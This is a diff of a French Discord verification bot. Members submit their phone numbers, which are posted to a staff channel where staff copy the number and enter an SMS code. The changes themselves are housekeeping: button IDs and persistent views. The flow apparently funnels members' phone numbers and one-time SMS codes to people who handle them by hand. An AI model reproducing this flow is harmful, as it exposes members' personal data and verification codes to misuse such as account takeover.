@@ -38,8 +38,6 @@ TANA_PINK = discord.Color.from_rgb(255, 153, 153) # Rose Tanalounge
 
 # --- MODAL POUR QUE LE MEMBRE ENTRE SON NUMÉRO ---
 class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de téléphone"):
-    # Note : Discord ne permet pas de changer la couleur de la bordure du TextInput par programmation,
-    # elle est définie par défaut par le thème client de l'utilisateur.
     phone_input = discord.ui.TextInput(
         label="Entre ton numéro (10 chiffres, sans lettres)",
         placeholder="Ex: 0612345678",
@@ -63,7 +61,7 @@ class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de
         if staff_channel:
             embed = discord.Embed(
                 title="VÉRIFICATION",
-                color=TANA_PINK # Utilisation du rose
+                color=TANA_PINK
             )
             
             embed.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
@@ -80,12 +78,12 @@ class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de
             
             VERIFICATION_MESSAGES[interaction.user.id] = msg
 
-# --- VUE DU BOUTON "SE VÉRIFIER" ---
+# --- VUE DU BOUTON "SE VÉRIFIER" (AVEC PERSISTANCE) ---
 class PublicVerifyView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="Se vérifier", style=discord.ButtonStyle.green, custom_id="public_verify_btn")
+    @discord.ui.button(label="Se vérifier", style=discord.ButtonStyle.green, custom_id="persistent_public_verify_btn")
     async def verify_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         modal = UserPhoneNumberModal()
         await interaction.response.send_modal(modal)
@@ -106,7 +104,6 @@ class StaffCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
 
     async def on_submit(self, interaction: discord.Interaction):
         code_saisi = self.code_input.value
-        
         embed = interaction.message.embeds[0]
         
         champ_trouve = False
@@ -129,7 +126,7 @@ class VerificationView(discord.ui.View):
         self.numero = numero
         self.claimed_by = None
 
-    @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, emoji="✅", custom_id="claim_btn")
+    @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, emoji="✅", custom_id="claim_btn_dynamic")
     async def claim_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by is not None and self.claimed_by != interaction.user.id:
             await interaction.response.send_message("❌ Ce dossier a déjà été pris en charge par un autre membre du staff !", ephemeral=True)
@@ -140,9 +137,9 @@ class VerificationView(discord.ui.View):
         button.disabled = True
         
         await interaction.response.edit_message(view=self)
-        await interaction.followup.send(f"🔒 Dossier claimé par {interaction.user.mention}. Vous seul pouvez désormais gérer cette vérification.", ephemeral=True)
+        await interaction.followup.send(f"🔒 Dossier claimé par {interaction.user.mention}.", ephemeral=True)
 
-    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.secondary, emoji="📩", custom_id="ask_code_btn")
+    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.secondary, emoji="📩", custom_id="ask_code_btn_dynamic")
     async def ask_code_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by and self.claimed_by != interaction.user.id:
             await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
@@ -150,14 +147,14 @@ class VerificationView(discord.ui.View):
         modal = StaffCodeModal(self)
         await interaction.response.send_modal(modal)
 
-    @discord.ui.button(label="Copier", style=discord.ButtonStyle.primary, emoji="📋", custom_id="copy_btn")
+    @discord.ui.button(label="Copier", style=discord.ButtonStyle.primary, emoji="📋", custom_id="copy_btn_dynamic")
     async def copy_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by and self.claimed_by != interaction.user.id:
             await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
             return
         await interaction.response.send_message(f"`{self.numero}`", ephemeral=True)
 
-    @discord.ui.button(label="Accepter", style=discord.ButtonStyle.success, emoji="✔", custom_id="accept_btn")
+    @discord.ui.button(label="Accepter", style=discord.ButtonStyle.success, emoji="✔", custom_id="accept_btn_dynamic")
     async def accept_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by and self.claimed_by != interaction.user.id:
             await interaction.response.send_message("❌ Vous ne pouvez pas valider ce dossier !", ephemeral=True)
@@ -169,7 +166,7 @@ class VerificationView(discord.ui.View):
         await interaction.response.edit_message(view=self)
         await interaction.followup.send("✅ Vérification acceptée avec succès.", ephemeral=True)
 
-    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.danger, emoji="✖", custom_id="refuse_btn")
+    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.danger, emoji="✖", custom_id="refuse_btn_dynamic")
     async def refuse_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by and self.claimed_by != interaction.user.id:
             await interaction.response.send_message("❌ Vous ne pouvez pas refuser ce dossier !", ephemeral=True)
@@ -183,37 +180,31 @@ class VerificationView(discord.ui.View):
 
 @bot.event
 async def on_ready():
-    print(f"Bot connecté en tant que {bot.user}")
+    # Enregistrement de la vue persistante pour que le bouton fonctionne toujours
+    bot.add_view(PublicVerifyView())
+    print(f"Bot connecté en tant que {bot.user} et vues persistantes chargées.")
 
 @bot.event
 async def on_member_remove(member):
-    """Met à jour en temps réel si le membre quitte le serveur"""
     if member.id in VERIFICATION_MESSAGES:
         message = VERIFICATION_MESSAGES[member.id]
         try:
             embed = message.embeds[0]
             embed.color = discord.Color.from_rgb(231, 76, 60)
-            
-            champ_trouve = False
             for i, field in enumerate(embed.fields):
                 if "Présence" in field.name:
                     embed.set_field_at(i, name="🔴 Présence", value="❌ A quitté le serveur", inline=False)
-                    champ_trouve = True
                     break
-            if not champ_trouve:
-                embed.add_field(name="🔴 Présence", value="❌ A quitté le serveur", inline=False)
-
             await message.edit(embed=embed)
         except Exception as e:
-            print(f"Erreur lors de la mise à jour du départ du membre : {e}")
+            print(f"Erreur : {e}")
 
 @bot.command()
 async def setup_verify(ctx):
-    """Envoie le message avec le bouton 'Se vérifier' sur le serveur principal"""
     embed = discord.Embed(
         title="📱 Vérification",
         description="Clique sur le bouton ci-dessous pour entrer ton numéro et lancer ta vérification.\nLe staff recevra ensuite ta demande.",
-        color=TANA_PINK # Utilisation du rose
+        color=TANA_PINK
     )
     view = PublicVerifyView()
     await ctx.send(embed=embed, view=view)
